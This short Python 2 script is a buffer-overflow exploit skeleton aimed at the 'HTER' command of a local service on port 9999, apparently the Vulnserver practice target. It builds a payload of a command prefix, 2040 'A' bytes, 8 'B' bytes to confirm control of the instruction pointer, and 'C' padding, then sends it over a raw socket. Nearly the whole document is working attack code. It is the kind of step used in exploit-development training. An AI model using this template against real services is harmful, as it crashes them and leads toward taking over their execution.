import socket
import os
import sys

vuln_command = "HTER A"    # Added "A"
crash = 2052    # -1 for "A" added to the above "vuln_command"
offset = 2040

payload = ""
payload += vuln_command
payload += "A" * offset
payload += "B" * 8
payload += "C" * (crash - len(payload))

print "[+] Sending buffer (Size: %d)" % len(payload)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 9999))
print(s.recv(1024))
s.send(payload)
s.close()
